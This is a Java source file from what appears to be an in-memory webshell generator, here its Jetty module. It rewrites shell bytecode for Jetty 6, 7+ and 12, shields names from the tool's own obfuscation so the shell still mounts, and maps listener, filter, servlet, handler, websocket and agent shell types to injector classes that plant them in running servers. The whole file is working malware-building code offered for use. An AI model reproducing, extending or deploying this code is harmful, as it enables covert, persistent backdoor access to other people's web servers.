package com.reajason.javaweb.memshell.server.jetty;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.asm.ClassRenameUtils;
import com.reajason.javaweb.asm.ClassSuperClassUtils;
import com.reajason.javaweb.asm.MethodUtils;
import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.obfuscation.FieldContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import java.util.Set;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/7
 */
public class Jetty extends AbstractServer {

    public static class ListenerInterceptor {

        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            try {
                response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_channel"), "_response");
            } catch (Exception e) {
                try {
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_connection"), "_response");
                } catch (Exception ex) {
                    response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "_servletChannel"), "_response"), "_servletApiResponse");
                }
            }
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public Set<MethodSignature> getShellMethodContracts(String shellType) {
        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
            return MethodContracts.JETTY_HANDLER_CONTRACTS;
        }
        return super.getShellMethodContracts(shellType);
    }

    /**
     * JettyHandlerInjector 注入后按名反射回填 {@code nextHandler}；字段名被混淆后马挂载失败。
     */
    @Override
    public Set<String> getShellFieldContracts(String shellType) {
        if (HANDLER.equals(shellType) || JAKARTA_HANDLER.equals(shellType)) {
            return FieldContracts.JETTY_HANDLER_FIELDS;
        }
        return super.getShellFieldContracts(shellType);
    }

    /**
     * Handler 马按 Jetty 版本改写：裁剪不匹配的 handle 方法并换上对应版本的父类；
     * RawWebSocket 则按 shell 类名派生 helper 并随注入器下发。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        String shellType = shellConfig.getShellType();
        if (RAW_WEBSOCKET.equals(shellType) || JAKARTA_RAW_WEBSOCKET.equals(shellType)) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(JettyRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
            return shellBytes;
        }
        if (!HANDLER.equals(shellType) && !JAKARTA_HANDLER.equals(shellType)) {
            return shellBytes;
        }
        String superClassName = null;
        String serverVersion = shellConfig.getServerVersion();
        if (serverVersion != null) {
            switch (serverVersion) {
                case "6":
                    superClassName = "org/mortbay/jetty/handler/AbstractHandler";
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Lorg/eclipse/jetty/server/Request;Lorg/eclipse/jetty/server/Response;Lorg/eclipse/jetty/util/Callback;)Z");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Lorg/eclipse/jetty/server/Request;Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V");
                    shellBytes = ClassRenameUtils.relocateClass(shellBytes, "org/eclipse/jetty/server", "org/mortbay/jetty");
                    break;
                case "7+":
                    superClassName = "org/eclipse/jetty/server/handler/AbstractHandler";
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Lorg/eclipse/jetty/server/Request;Lorg/eclipse/jetty/server/Response;Lorg/eclipse/jetty/util/Callback;)Z");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;I)V");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;I)V");
                    break;
                case "12":
                    superClassName = "org/eclipse/jetty/server/Handler$Abstract";
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/Object;Ljava/lang/Object;)Z");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;I)V");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;I)V");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Lorg/eclipse/jetty/server/Request;Ljavax/servlet/http/HttpServletRequest;Ljavax/servlet/http/HttpServletResponse;)V");
                    shellBytes = MethodUtils.removeMethodByMethodDescriptor(shellBytes, "handle", "(Ljava/lang/String;Lorg/eclipse/jetty/server/Request;Ljakarta/servlet/http/HttpServletRequest;Ljakarta/servlet/http/HttpServletResponse;)V");
                    break;
            }
        }
        if (superClassName == null) {
            throw new GenerationException("serverVersion is needed for Jetty Handler or unknow serverVersion: [" + serverVersion + "], please use one of ['6', '7+', '12'] for shellConfig.serverVersion");
        }
        return ClassSuperClassUtils.addSuperClass(shellBytes, superClassName);
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.jetty.JettyListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.jetty.JettyListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.jetty.JettyFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.jetty.JettyFilterInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.jetty.JettyServletInjector")
                .addInjector(JAKARTA_SERVLET, "com.reajason.javaweb.memshell.injector.jetty.JettyServletInjector")
                .addInjector(HANDLER, "com.reajason.javaweb.memshell.injector.jetty.JettyHandlerInjector")
                .addInjector(JAKARTA_HANDLER, "com.reajason.javaweb.memshell.injector.jetty.JettyHandlerInjector")
                .addInjector(CUSTOMIZER, "com.reajason.javaweb.memshell.injector.jetty.JettyCustomizerInjector")
                .addInjector(JETTY_AGENT_HANDLER, "com.reajason.javaweb.memshell.injector.jetty.JettyHandlerAgentInjector")
                .addInjector(WEBSOCKET, "com.reajason.javaweb.memshell.injector.jetty.JettyWebSocketInjector")
                .addInjector(JAKARTA_WEBSOCKET, "com.reajason.javaweb.memshell.injector.jetty.JettyWebSocketInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.jetty.JettyRawWsInjector")
                .addInjector(JAKARTA_RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.jetty.JettyRawWsInjector")
                .build();
    }
}
